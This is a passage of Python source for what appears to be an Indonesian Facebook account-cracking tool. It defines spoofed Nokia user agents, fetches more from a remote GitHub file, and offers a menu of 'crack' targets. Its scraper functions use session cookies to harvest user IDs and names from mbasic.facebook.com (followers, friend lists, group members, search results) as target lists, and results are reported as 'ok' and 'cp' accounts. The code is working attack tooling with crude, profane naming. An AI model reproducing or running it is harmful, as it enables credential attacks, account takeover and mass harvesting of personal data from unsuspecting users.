profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia305/05.92; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia114/03.47; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.3.0.0.48", "mozilla/5.0 (series40; nokia305/07.42; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia210/06.09; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia210/04.12; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia206/04.52; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia206/03.59; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia305/03.60; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia302/14.26; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokiac2-03/06.96; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.3.0.0.49", "mozilla/5.0 (series40; nokia206/03.58; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia206/03.59; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia2730c-1/10.47; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia305/03.60; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (series40; nokia112/03.48; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia203/20.26; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.3.0.0.49", "mozilla/5.0 (series40; nokiac1-01/06.15; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia112/03.48; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia301/09.04; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia208.1/04.06; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia302/14.26; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia210/04.12; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia2730c-1/10.47; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.3.0.0.49", "mozilla/5.0 (series40; nokia306/07.42; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia200/10.58; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia200/11.95; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.7.0.0.11", "mozilla/5.0 (series40; nokia308/08.13; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.3.0.0.54", "mozilla/5.0 (series40; nokia208/03.39; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia202/20.36; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia200/10.58; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.3.0.0.49", "mozilla/5.0 (series40; nokia208/ddecl3g_13w22; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.3.0.0.55", "mozilla/5.0 (series40; nokia205/03.18; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia200/11.56; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.0.2.68.14", "mozilla/5.0 (series40; nokiac2-03/07.29; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia112/03.32; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokiac2-03/07.65; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia114/03.51; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia200/12.04; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokiax2-02/11.57; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia112/03.28; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia502/14.0.4/java_runtime_version=nokia_asha_1_2; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.20", "mozilla/5.0 (series40; nokia311/05.92; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.3.0.0.49", "mozilla/5.0 (series40; nokia305/05.92; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.1.0.0.62", "mozilla/5.0 (series40; nokia200/10.61; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokiax3-02/le6.32; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/1.0.0.11.8", "mozilla/5.0 (series40; nokia112/03.51; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia200/11.95; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (series40; nokia302/14.92; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokiax2-02/11.79; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia203/20.36; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokiax2-02/11.79; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (series40; nokia502/14.0.5/java_runtime_version=nokia_asha_1_2; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.20", "mozilla/5.0 (series40; nokia2055/03.20; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokiax2-01/08.70; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.7.0.0.11", "mozilla/5.0 (series40; nokiac2-03/06.96; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (series40; nokia311/03.81; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia306/07.42; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia301/02.33; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia302/14.78; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.0.2.68.9", "mozilla/5.0 (series40; nokiac2-03/07.63; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.7.0.0.11", "mozilla/32.0.3 (series40; nokia305/07.42; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia200/11.56; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (series40; nokia302/14.53; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia203/20.36; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.0.1.62.6", "mozilla/5.0 (series40; nokia308/05.80; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia202/20.52; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia515.2/05.08; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia210.2/06.09; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokiax2-00/04.80; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (series40; nokiaasha230dualsim/14.0.5/java_runtime_version=nokia_asha_1_2; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.20", "mozilla/5.0 (series40; nokiac2-03/07.48; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia305/07.42; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia203/20.52; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.1.0.1", "mozilla/5.0 (series40; nokia205/03.19; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia208.4/06.01; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia205/03.19; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.1.0.1", "mozilla/5.0 (series40; nokia515.2/10.34; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.3.0.0.49", "mozilla/5.0 (series40; nokia305/03.60; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.7.0.0.11", "mozilla/5.0 (series40; nokia200/11.64; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (series40; nokia6300/07.30; profile/midp-2.0 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.0.2.68.14", "mozilla/5.0 (series40; nokia200/10.61; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.1.0.1", "mozilla/5.0 (series40; nokiac1-01/06.15; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia205/04.51; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia205/03.19; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.2.0.0.34", "mozilla/5.0 (series40; nokia200/11.81; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia6300/07.30; profile/midp-2.0 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia208/03.39; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.3.0.0.55", "mozilla/5.0 (series40; nokia200/11.64; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.2.0.0.36", "mozilla/5.0 (series40; nokia201/11.81; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia205/03.18; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.2.0.0.34", "mozilla/5.0 (series40; nokia208/09.05; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokiax2-02/10.90; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/1.0.2.26.11", "mozilla/5.0 (series40; nokia205.1/04.51; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia200/11.95; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.0.1.62.6", "mozilla/5.0 (series40; nokiax2-02/12.04; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokiax2-02/11.84; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.0.1.62.6", "mozilla/5.0 (series40; nokia208/10.34; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia2700c-2/07.80; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.7", "mozilla/5.0 (symbianos/9.4; series60/5.0 nokiac5-03/23.0.015; profile/midp-2.1 configuration/cldc-1.1 ) applewebkit/533.4 (khtml, like gecko) nokiabrowser/7.3.1.33 mobile safari/533.4", "mozilla/5.0 (series40; nokia301.1/08.02; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia200/11.64; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.0.2.68.14", "mozilla/5.0 (series40; nokia206/04.52; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokiax2-02/11.84; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.0.2.68.14", "mozilla/5.0 (series40; nokia200/12.04; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.2.0.0.36", "mozilla/5.0 (series40; nokia200/11.81; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.3.0.0.48", "mozilla/5.0 (series40; nokiac2-03/06.96; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.7.0.0.11", "mozilla/5.0 (series40; nokia200/11.81; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.2.0.0.36", "mozilla/5.0 (series40; nokia2055/03.20; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.2.0.0.34", "mozilla/5.0 (series40; nokia305/07.35; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.3.0.0.54", "mozilla/5.0 (symbianos/9.3; series60/3.2 nokiae72-1/091.004; profile/midp-2.1 configuration/cldc-1.1 ) applewebkit/533.4 (khtml, like gecko) nokiabrowser/7.3.1.34 mobile safari/533.4", "mozilla/5.0 (series40; nokia200/11.56; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.0.1.62.6", "mozilla/5.0 (series40; nokia207.1/10.24; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.3.0.0.55", "mozilla/5.0 (series40; nokia200/11.81; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.2.0.0.36", "mozilla/5.0 (series40; nokia200/12.04; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia110/03.47; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (series40; nokia2052/03.20; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.2.0.0.34", "mozilla/5.0 (series40; nokia307/07.55; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.2.0.0.36", "mozilla/5.0 (series40; nokiax3-02/10.90; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/1.0.2.26.11", "mozilla/5.0 (series40; nokia200/10.60; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (linux; android 4.1.2; gt-p3110; profile/midp-2.1 configuration/cldc-1.1 ) applewebkit/535.1 (khtml, like gecko) nokiabrowser/8.3.1.4 mobile safari/535.1", "mozilla/5.0 (series40; nokia200/11.56; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia208.4/04.06; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia305/07.42; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45. browser: nokia browser os40", "mozilla/5.0 (series40; nokia305/07.42; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokiac3-01/07.53; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokiax2-02/11.84; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.0.2.68.14", "mozilla/5.0 (series40; nokiax2-02/10.90;profile/midp-2.1 configuration/cld-1.1) gecko/20100401 s40ovibrowser/1.0.2.26.11", "mozilla/5.0 (series40; nokia200/11.95; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.1.0.1", "mozilla/5.0 (series40; nokia200/10.60; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/1.0.2.26.11", "mozilla/5.0 (symbian/3; android 2.3.5; nokia808pureview/113.010.1508; profile/midp-2.1 configuration/cldc-1.1 ) applewebkit/535.1 (khtml, like gecko) nokiabrowser/8.3.2.21 mobile safari/535.1", "mozilla/5.0 (windows nt 6.1; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/58.0.3029.110 safari/537.36 mozilla/5.0 (series40; nokia200/11.81; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (series40; nokia200/10.60; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.3.0.0.49", "mozilla/5.0 (macintosh; intel mac os x 10_13_1) applewebkit/537.36 (khtml, like gecko) chrome/62.0.3202.94 safari/537.36 mozilla/5.0 (series30plus; nokia225/20.10.11; profile/series30plus configuration/series30plus) gecko/20100401 s40ovibrowser/3.8.1.2.06", "mozilla/5.0 (symbianos/9.4; series60/5.0 nokia5800d-1/60.0.003; profile/midp-2.1 configuration/cldc-1.1 ) applewebkit/533.4 (khtml, like gecko) nokiabrowser/7.3.1.33 mobile safari/533.4", "mozilla/5.0 (series40; nokia305/07.35; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.3.0.0.54", "mozilla/5.0 (series40; nokia200/11.95; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.2.0.0.6", "mozilla/5.0 (series40; nokia515/07.01; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 applewebkit/533.4 (khtml, like gecko) nokiabrowser/7.3.1.33 mobile safari/533.4", "mozilla/5.0 (series40; nokia208/04.51; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (series30plus; nokia225/20.10.11; profile/series30plus configuration/series30plus) gecko/20100401 s40ovibrowser/3.8.1.2.0612", "mozilla/5.0 (series40; nokia303/14.87; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (series40; nokia200/11.56; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.3.0.0.48", "mozilla/5.0 (series40; nokia205.1/04.51; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (series40; nokia2700-2/07.80; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45"])
ua_=requests.get("https://raw.githubusercontent.com/hakiki-xc/hakiki-xc/main/ua.txt").text.strip()
runtah=["password/__pycache__","kentod/__pycache__"]
try:
	hapus(runtah[0])
except:
	pass
try:
	hapus(runtah[1])
except:
	pass
def hasil(ngocok,ismylife):
	if len(ngocok) != 0 or len(ismylife) != 0:
		print(f"\n\n[#] \x1b[1;35mcrack selesai.....\n\x1b[0m[*] \x1b[1;32mok\x1b[0m/\x1b[1;33mcp \x1b[0m: \x1b[1;32m{len(ngocok)}\x1b[0m/\x1b[1;33m{len(ismylife)}\x1b[0m")
		if len(ngocok)==0:pass
		else:print("[*] \x1b[1;32mhasil ok disimpan di  : ok.txt \x1b[0m")
		if len(ismylife)==0:pass
		else:print("[*] \x1b[1;33mhasil cp disimpan di : cp.txt")
		exit()
	else:exit("\n\n\x1b[1;31m[!] tidak mendapatkan hasil:(")

nama = "{tentang.get('nama')}"
def logo():
	os.system("clear")
	print(f"""
________               _____ _____________________
\______ \             /     \\______   \_   _____/
 |    |  \   ______  /  \ /  \|    |  _/|    __)  
 |    `   \ /_____/ /    y    \    |   \|     \   
/_______  /         \____|__  /______  /\___  /   
        \/                  \/       \/     \/    
""")
class about:
	def __init__(self,url):
		self.url=url
	def tentang(self):
		try:
			anjir=req.get(f"{self.url}/profile.php",cookies=kueh).text
		except(req.exceptions.connectionerror,req.exceptions.chunkedencodingerror,req.exceptions.readtimeout):
			exit("[!] kesalahan pada koneksi")
		if "mbasic_logout_button" not in anjir:
			try:os.remove("lo_ngentod/cookie");os.remove("lo_ngentod/token");os.remove("lo_ngentod/my_info")
			except:os.system("rm -rf lo_ngentod/cookie && rm -rf lo_ngentod/token && rm -rf lo_ngentod/my_info")
			exit("[!] cookies kedaluwarsa, harap login ulang")
		else:
			logo()
			print(f'{p}[+] api key         : '+open('licensed.log').read())
			print(f"{p}[+] bergabung       : {durasi}-06-20 ({h}unlimited{p})")
			print(f"[+] --------------------------------------------")
			print(f"[+] premium         : {h}ya")
			print(f"{p}[+] kadaluwarsa     : 2026-2-6-")
			print(f"[+] --------------------------------------------")
			print(f"[+] ip              : {ip}")
			print(f"")
			print(f"[ selamat datang {k}{tentang.get('nama')} {p}]")
			print(f"")
			print("[01]. crack dari followers")
			print("[02]. crack dari daftar teman")
			print("[03]. crack dari member grup")
			print("[04]. crack dari pencarian nama")
			print("[05]. crack dari teman  target")
			print("[06]. crack dari permintaan pertemanan")
			print("[07]. crack dari permintaan terkirim")
			print("[08]. crack dari reaction post")
			print("[09]. crack dari saran teman")
			print("[10]. crack dari hashtag")
			print("[11]. seting user agent")
			print(f"[{m}00{p}] exit ( hapus cookie ) ")
			print(f"")
	
class ngentod:
	def __init__(self):
		self.url="https://mbasic.facebook.com"
		self.id=[]
	def folower(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>',kontol)
			
			for softek in memek:
				if "&amp;refid=" in softek[0]:
					self.id.append(re.findall("id=(.*?)&",softek[0])[0]+"[aapafandiganteng]"+softek[1])
				elif "profile.php?" in softek[0]:
					self.id.append(re.findall("id=(.*)",softek[0])[0]+"[aapafandiganteng]"+softek[1])
				elif "?refid=" in softek[0]:
					self.id.append(re.findall("(.*?)\?refid=",softek[0])[0]+"[aapafandiganteng]"+softek[1])
				else:
					self.id.append(softek[0]+"[aapafandiganteng]"+softek[1])
				print(f"\r[*] sedang mengumpulkan {len(self.id)} id... ",end="")
			if "lihat selengkapnya" in kontol:
				self.folower(self.url+parser(kontol,"html.parser").find("a",string="lihat selengkapnya").get("href"))
		except:pass
	def babaturan(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			
			for softek in memek:
				if "?uid" in softek[0]:
					self.id.append(re.findall("uid\=(.*?)\&",softek[0])[0]+"[aapafandiganteng]"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"[aapafandiganteng]"+softek[1])
				print(f"\r[*] sedang mengumpulkan {len(self.id)} id... ",end="")
			if "lihat selengkapnya" in kontol:
				self.babaturan(self.url+parser(kontol,"html.parser").find("a",string="lihat selengkapnya").get("href"))
		except:pass
	def memekgrup(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',kontol)
			
			for softek in memek:
				if "profile.php?" in softek[0]:
					self.id.append(re.findall("id=(.*)",softek[0])[0]+"[aapafandiganteng]"+softek[1])
				else:
					self.id.append(softek[0]+"[aapafandiganteng]"+softek[1])
				print(f"\r[*] sedang mengumpulkan {len(self.id)} id... ",end="")
			if "lihat selengkapnya" in kontol:
				self.memekgrup(self.url+parser(kontol,"html.parser").find("a",string="lihat selengkapnya").get("href"))
			else:
				def geh(gey):
					a=req.get(gey,cookies=kueh).text
					b=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>',a)
					if len(b)!=0:
						
						for c in b:
							if "profile.php" in c[0]:
								d=re.search("profile.php\?id=(\\d*)",c[0]).group(1)
								if d in self.id:
									continue
								else:
									self.id.append(d+"[aapafandiganteng]"+c[1])
							else:
								d=re.search("(.*?)\?refid",c[0]).group(1)
								if d in self.id:
									continue
								else:
									self.id.append(d+"[aapafandiganteng]"+c[1])
							print(f"\r[*] sedang mengumpulkan {len(self.id)} id... ",end="")
					if "lihat postingan lainnya" in a:
						geh(self.url+parser(a,"html.parser").find("a",string="lihat postingan lainnya").get("href"))
				geh(f"{self.url}/groups/"+re.search("id=(\\d*)",hencet).group(1))
		except:pass
	def teangan(self,hencet): #,jum):
		try:
			true=false
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('picture" \/>\<\/a\>\<\/td\>\<td\ class\=\"(.*?)\"\>\<a\ href\=\"\/(.*?)"\>\<div\ class\=\"..\"\>\<div\ class\=\"..\"\>(.*?)<\/div>',kontol)
			
			for softek in memek:
				if "profile.php?" in softek[1]:
					self.id.append(re.findall("id=(.*?)&amp;refid",softek[1])[0]+"[aapafandiganteng]"+softek[2])
				else:
					self.id.append(re.findall("(.*?)\?refid=",softek[1])[0]+"[aapafandiganteng]"+softek[2])
				print(f"\r[*] sedang mengumpulkan {len(self.id)} id... ",end="")
				#if len(self.id)==jum:
					#true=true
					#break
			if true==false:
				if "lihat hasil selanjutnya" in kontol:
					self.teangan(parser(kontol,"html.parser").find("a",string="lihat hasil selanjutnya").get("href")) #,jum)
		except:pass
	def flrencang(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			
			for softek in memek:
				if "profile.php?" in softek[0]:
					self.id.append(re.findall("id\=(.*?)\&",softek[0])[0]+"[aapafandiganteng]"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"[aapafandiganteng]"+softek[1])
				print(f"\r[*] sedang mengumpulkan {len(self.id)} id... ",end="")
			if "lihat teman lain" in kontol:
				self.flrencang(self.url+parser(kontol,"html.parser").find("a",string="lihat teman lain").get("href"))
		except:pass
	def menta(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			
			for softek in memek:
				if "?uid" in softek[0]:
					self.id.append(re.findall("uid\=(.*?)\&",softek[0])[0]+"[aapafandiganteng]"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"[aapafandiganteng]"+softek[1])
				print(f"\r[*] sedang mengumpulkan {len(self.id)} id... ",end="")
